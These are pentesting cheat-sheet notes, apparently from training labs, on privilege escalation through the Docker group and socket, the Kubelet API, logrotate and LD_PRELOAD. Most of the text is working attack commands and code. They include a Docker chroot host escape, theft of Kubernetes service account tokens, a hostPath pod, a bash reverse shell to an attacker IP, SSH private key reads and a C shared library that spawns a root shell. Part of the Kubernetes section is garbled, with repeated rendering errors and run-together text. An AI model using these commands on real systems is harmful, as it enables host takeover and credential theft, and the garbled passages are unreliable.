
```
# ✅ Check if you're in docker group
id

# ✅ List Docker images
docker image ls

# ✅ List Docker containers
docker ps -a

# ✅ Mount host filesystem & escape to host root via chroot (main privesc one-liner)
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# ✅ If Docker socket exposed (inside container)
ls -al /app/docker.sock  # or /var/run/docker.sock

# ✅ If Docker binary missing inside container, upload it
wget https://<attacker-ip>:443/docker -O docker
chmod +x docker

# ✅ List running containers via docker socket inside container
/tmp/docker -H unix:///app/docker.sock ps

# ✅ Launch new privileged container mounting host filesystem inside container
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

# ✅ Get shell inside new privileged container
/tmp/docker -H unix:///app/docker.sock exec -it <container-id> /bin/bash

# ✅ Navigate to host filesystem from inside privileged container
cd /hostsystem

# ✅ Extract private keys from host (example)
cat /hostsystem/root/.ssh/id_rsa

```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# Kubernetes (K8s) Summary for Pentesting

## Overview

- Kubernetes (K8s) is an open-source container orchestration platform.  
- Developed by Google; now under Cloud Native Computing Foundation.  
- Manages deployment, scaling, and management of containerized applications.  
- Provides features like:  
  - Load balancing  
  - Service discovery  
  - Storage orchestration  
  - Self-healing  
  - RBAC (Role-Based Access Control)  
  - Network Policies  
  - Security Contexts

---

## Kubernetes Architecture

### Control Plane (Master Node)  
Responsible for managing the cluster:

| Component | Port |
| --- | --- |
| etcd | 2379, 2380 |
| API server | 6443 |
| Scheduler | 10251 |
| Controller Manager | 10252 |
| Kubelet API | 10250 |
| Read-Only Kubelet API | 10255 |

### Worker Nodes (Minions)  
- Run containerized apps.  
- Receive instructions from the Control Plane.  
- Execute workloads.

---

## Key Concepts

- **Pods**: Smallest deployable units (can contain one or more containers).
- **Namespaces**: Logical separation of cluster resources.
- **API Resources**: Pods, Services, Deployments, etc.

---

## Kubernetes vs Docker

| Function | Docker | Kubernetes |
| --- | --- | --- |
| Purpose | Container platform | Container orchestration |
| Scaling | Manual | Automatic |
| Networking | Simple | Complex w/ policies |
| Storage | Volumes | Multiple storage options |

---

## Kubernetes API

- API server handles all requests (`kubectl`, REST, etc.).  
- Supports declarative configuration.  
- REST operations: GET, POST, PUT, PATCH, DELETE.

### Authentication

- Supports:  
  - Client certificates  
  - Bearer tokens  
  - Authenticating proxy  
  - HTTP basic auth  
- Uses RBAC for authorization.

### Anonymous Access

- By default, Kubelet allows anonymous access.  
- Anonymous requests are unauthenticated:  
  ```bash  
  curl https://<k8s-api-ip>:6443 -k  
Kubelet API Pentesting  
Extracting Pods via Kubelet API  
bash  
Copy  
Edit  
curl https://<k8s-worker-ip>:10250/pods -k | jq .  
Output includes pod names, namespaces, containers, configs, and secrets.

Extracting Pods via kubeletctl  
bash  
Copy  
Edit  
kubeletctl -i --server <k8s-worker-ip> pods  
Scanning for RCE  
bash  
Copy  
Edit  
kubeletctl -i --server <k8s-worker-ip> scan rce  
Example Output:  
Node IP PODS Namespace Containers RCE  
10.129.10.11 nginx default nginx +  
etcd-steamcloud kube-system etcd - 

Gaining Shell Access (if vulnerable to RCE)  
bash  
Copy  
Edit  
kubeletctl -i --server <k8s-worker-ip> exec "id" -p nginx -c nginx  
If output: uid=0(root) gid=0(root), container is running as root.

Privilege Escalation  
Extracting Service Account Token  
bash  
Copy  
Edit  
kubeletctl -i --server <k8s-worker-ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token  
Extracting CA Certificate  
bash  
Copy  
Edit  
kubeletctl --server <k8s-worker-ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt  
Checking Permissions  
bash  
Copy  
Edit  
export token=`cat k8.token`  
kubectl --token=$token --certificate-authority=ca.crt --server=https://<k8s-api-ip>:6443 auth can-i --list If allowed to create pods, create a malicious pod: privesc.yaml yaml Copy Edit apiVersion: v1 kind: Pod metadata:   name: privesc   namespace: default spec:   containers:   - name: privesc     image: nginx:1.14.2     volumeMounts:     - mountPath: /root       name: mount-root-into-mnt   volumes:   - name: mount-root-into-mnt     hostPath:        path: /   automountServiceAccountToken: true   hostNetwork: true Deploy the pod bash Copy Edit kubectl --token=$

KaTeX parse error: Expected 'EOF', got '&' at position 55: …server=https://&̲lt;k8s-api-ip&g…

KaTeX parse error: Expected 'EOF', got '&' at position 55: …server=https://&̲lt;k8s-api-ip&g…

KaTeX parse error: Expected 'EOF', got '&' at position 55: …server=https://&̲lt;k8s-api-ip&g…

KaTeX parse error: Expected 'EOF', got '&' at position 55: …server=https://&̲lt;k8s-api-ip&g…

token --certificate-authority=ca.crt --server=https://<k8s-api-ip>:6443 apply -f privesc.yaml  
Verify running pods  
bash  
Copy  
Edit  
kubectl --token=$token --certificate-authority=ca.crt --server=https://<k8s-api-ip>:6443 get pods  
Extract Host Files (e.g., SSH key)  
bash  
Copy  
Edit  
kubeletctl --server <k8s-worker-ip> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc  
Summary  
Kubernetes pentesting often revolves around gaining access to Kubelet or API server.

Kubelet API is a key attack surface.

Privilege escalation can be performed via pod creation and hostPath mounts.

Service account tokens and certificates are valuable assets for lateral movement.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

## Exploiting Logrotate (Privilege Escalation)

### Conditions for exploitation:

- Writable log file.
    
- `logrotate` runs as root.
    
- Vulnerable versions:
    
    - 3.8.6
        
    - 3.11.0
        
    - 3.15.0
        
    - 3.18.0
        

### Exploit: **logrotten**

#### Download & Compile:

bash

CopyEdit

`git clone https://github.com/whotwagner/logrotten.gitcd logrottengcc logrotten.c -o logrotten`

#### Prepare payload (example: reverse shell):

bash

CopyEdit

`echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload`

#### Check `create` or `compress` option(method used by logrotate):

bash

CopyEdit

`grep "create\|compress" /etc/logrotate.conf | grep -v "#"`

#### Start listener on attack box:

bash

CopyEdit

`nc -nlvp 9001`

#### Run the exploit:

bash

CopyEdit

`./logrotten -p ./payload /tmp/tmp.log`

#### On listener (attacker machine):

bash

CopyEdit

`# iduid=0(root) gid=0(root) groups=0(root)`

&nbsp;

&nbsp;

&nbsp;

&nbsp;

## LD_PRELOAD Privilege Escalation

Let's see an example of how we can utilize the [LD_PRELOAD](https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. For this, we need a user with `sudo` privileges.

Shared Libraries

```shell-session
local_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

This user has rights to restart the Apache service as root, but since this is `NOT` a [GTFOBin](https://gtfobins.github.io/#apache) and the `/etc/sudoers` entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following library:

Code: c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can compile this as follows:

Shared Libraries

```shell-session
local_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.

Shared Libraries

```shell-session
local_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```
